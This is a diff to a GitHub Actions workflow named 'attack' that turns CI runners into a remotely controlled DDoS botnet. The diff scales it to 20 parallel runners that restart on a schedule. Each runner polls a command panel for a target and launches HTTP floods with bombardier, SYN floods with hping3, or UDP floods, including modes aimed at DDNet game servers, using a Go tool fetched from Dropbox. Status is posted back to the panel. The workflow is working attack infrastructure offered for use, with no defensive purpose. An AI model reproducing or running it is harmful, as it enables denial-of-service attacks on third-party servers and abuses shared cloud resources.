@@ -8,15 +8,18 @@ on:
         required: true
         default: 'https://aarr.alwaysdata.net/paneldemo/config.json'
 
-  # Авторестарт каждые ~5.5 часов
   schedule:
-    - cron: '0 0,6,12,18 * * *'    # 00:00, 06:00, 12:00, 18:00
-    - cron: '30 5,11,17,23 * * *'  # 05:30, 11:30, 17:30, 23:30
+    - cron: '0 0,6,12,18 * * *'
+    - cron: '30 5,11,17,23 * * *'
 
 jobs:
   attack:
     runs-on: ubuntu-latest
     timeout-minutes: 400
+    strategy:
+      fail-fast: false
+      matrix:
+        runner_id: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
 
     steps:
       - name: Checkout
@@ -32,36 +35,34 @@ jobs:
         run: |
           sudo apt-get update -qq && sudo apt-get install -y hping3 curl jq --no-install-recommends
           
-          # Bombardier
           if [ ! -f /usr/local/bin/bombardier ]; then
             wget -q https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier-linux-amd64
             chmod +x bombardier-linux-amd64
             sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier
           fi
 
-          # Bombarida
           if [ ! -f ./bombarida ]; then
             wget -q -O bombarida.go "https://www.dropbox.com/scl/fi/zss6t38cy6wdztch3p5sj/bombarida_firewall_direct-1.go?rlkey=sz2tagt1enucywsrj6d7ei19k&st=8pzgzqbz&dl=1"
             go build -o bombarida bombarida.go
             chmod +x bombarida
           fi
 
-      - name: JSON Controller + Logging (Runner 1)
+      - name: JSON Controller + Logging
         env:
           JSON_URL: ${{ inputs.json_url }}
-          LOG_URL: "https://aarr.alwaysdata.net/paneldemo/log.php"   # ← Обязательно поменяй!
-          RUNNER_ID: "runner1"
+          LOG_URL: "https://aarr.alwaysdata.net/paneldemo/log.php"
+          RUNNER_ID: "runner${{ matrix.runner_id }}"
         run: |
-          echo "=== Ultimate Multi-Tool Auto Controller запущен ==="
-          echo "Polling URL: $JSON_URL каждые 2 секунды"
+          echo "=== Runner $RUNNER_ID запущен ==="
+          echo "Polling: $JSON_URL"
 
           CURRENT_PID=0
           CURRENT_PARAMS=""
 
           while true; do
-            # === Получение JSON ===
+            # Получение JSON
             if ! JSON=$(curl -s -m 6 "$JSON_URL"); then
-              echo "[-] Failed to fetch JSON, retrying..."
+              echo "[-] Failed to fetch JSON"
               sleep 2
               continue
             fi
@@ -75,7 +76,6 @@ jobs:
             RATE=$(echo "$JSON" | jq -r '.rate // "0"')
             OPEN_LOOP=$(echo "$JSON" | jq -r '.open_loop // "false"')
 
-            # Firewall Check параметры
             FW_MAX_PPS=$(echo "$JSON" | jq -r '.fw_max_pps // "5000"')
             FW_START_PPS=$(echo "$JSON" | jq -r '.fw_start_pps // "50"')
             FW_STEP_UP=$(echo "$JSON" | jq -r '.fw_step_up // "150"')
@@ -84,66 +84,51 @@ jobs:
 
             NEW_PARAMS="${METHOD}|${TARGET}|${PORT}|${CONNECTIONS}|${DURATION}|${RATE}"
 
-            # === Управление атакой ===
+            # Управление атакой
             if [[ "$COMMAND" == "stop" || "$COMMAND" == "idle" ]]; then
               if [ $CURRENT_PID -ne 0 ]; then
-                echo "[+] Остановка атаки (PID: $CURRENT_PID)"
+                echo "[+] [$RUNNER_ID] Остановка атаки"
                 kill $CURRENT_PID 2>/dev/null || true
                 wait $CURRENT_PID 2>/dev/null || true
                 CURRENT_PID=0
               fi
-              echo "[i] Idle / Stopped - waiting for new command..."
             elif [ "$NEW_PARAMS" != "$CURRENT_PARAMS" ] || [ $CURRENT_PID -eq 0 ]; then
-              # Перезапуск атаки
               if [ $CURRENT_PID -ne 0 ]; then
-                echo "[~] Параметры изменились → перезапуск"
+                echo "[~] [$RUNNER_ID] Перезапуск атаки"
                 kill $CURRENT_PID 2>/dev/null || true
                 wait $CURRENT_PID 2>/dev/null || true
               fi
 
-              echo "=== Запуск $METHOD → $TARGET:$PORT ==="
+              echo "=== [$RUNNER_ID] Запуск $METHOD → $TARGET:$PORT ==="
 
               case "$METHOD" in
                 "http")
                   bombardier -c 1000 -d "$DURATION" --http2 -l "$TARGET?cache=$RANDOM" &
                   ;;
-
                 "tcp")
                   sudo hping3 --flood -S -p "$PORT" "$TARGET" &
                   ;;
-
                 "udp")
-                  ./bombarida -mode client -addr "${TARGET}:${PORT}" \
-                    -c "$CONNECTIONS" -n 0 -d "$DURATION" -r "$RATE" -t 1s &
+                  ./bombarida -mode client -addr "${TARGET}:${PORT}" -c "$CONNECTIONS" -n 0 -d "$DURATION" -r "$RATE" -t 1s &
                   ;;
-
                 udp-ddnet-*)
                   DDNET_FLAGS="-ddnet-info"
                   case "$METHOD" in
                     "udp-ddnet-vanilla") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind vanilla" ;;
                     "udp-ddnet-extended") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind extended" ;;
                     "udp-ddnet-legacy64") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind legacy64" ;;
-                    "udp-ddnet-mixed") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind mixed" ;;
+                    "udp-ddnet-mixed")  DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind mixed" ;;
                   esac
                   [ "$OPEN_LOOP" = "true" ] && DDNET_FLAGS="$DDNET_FLAGS -open-loop"
-
-                  ./bombarida -mode client -addr "${TARGET}:${PORT}" \
-                    -c "$CONNECTIONS" -n 0 -d "$DURATION" -r "$RATE" $DDNET_FLAGS &
+                  ./bombarida -mode client -addr "${TARGET}:${PORT}" -c "$CONNECTIONS" -n 0 -d "$DURATION" -r "$RATE" $DDNET_FLAGS &
                   ;;
-
                 "firewall-check")
-                  FW_FLAGS="-firewall-check \
-                    -fw-max-pps $FW_MAX_PPS \
-                    -fw-start-pps $FW_START_PPS \
-                    -fw-step-up $FW_STEP_UP \
-                    -fw-loss-threshold $FW_LOSS_THRESHOLD"
+                  FW_FLAGS="-firewall-check -fw-max-pps $FW_MAX_PPS -fw-start-pps $FW_START_PPS -fw-step-up $FW_STEP_UP -fw-loss-threshold $FW_LOSS_THRESHOLD"
                   [ "$FW_PAD_DDNET" = "true" ] && FW_FLAGS="$FW_FLAGS -fw-pad-ddnet"
-
                   ./bombarida -mode client -addr "${TARGET}:${PORT}" $FW_FLAGS &
                   ;;
-
                 *)
-                  echo "[-] Неизвестный метод: $METHOD"
+                  echo "[-] Неизвестный метод"
                   sleep 5
                   continue
                   ;;
@@ -151,25 +136,21 @@ jobs:
 
               CURRENT_PID=$!
               CURRENT_PARAMS="$NEW_PARAMS"
-              echo "[+] Атака успешно запущена (PID: $CURRENT_PID)"
+              echo "[+] [$RUNNER_ID] Атака запущена (PID: $CURRENT_PID)"
             fi
 
-            # === Логирование каждые 2 секунды (только runner1) ===
+            # === Логирование (только runner1) ===
             if [ "$RUNNER_ID" = "runner1" ] && [ $CURRENT_PID -ne 0 ]; then
-              LOG_DATA=$(cat <<EOF
-                {
-                  "runner": "$RUNNER_ID",
-                  "method": "$METHOD",
-                  "target": "$TARGET",
-                  "port": "$PORT",
-                  "status": "running",
-                  "pid": $CURRENT_PID,
-                  "timestamp": "$(date -u +%s)"
-                }
-                EOF
-                )
-              curl -s -X POST -H "Content-Type: application/json" \
-                -d "$LOG_DATA" "$LOG_URL" || true
+              LOG_DATA='{
+  "runner": "'$RUNNER_ID'",
+  "method": "'$METHOD'",
+  "target": "'$TARGET'",
+  "port": "'$PORT'",
+  "status": "running",
+  "pid": '$CURRENT_PID',
+  "timestamp": "'$(date -u +%s)'"
+}'
+              curl -s -X POST -H "Content-Type: application/json" -d "$LOG_DATA" "$LOG_URL" || true
             fi
 
             sleep 2
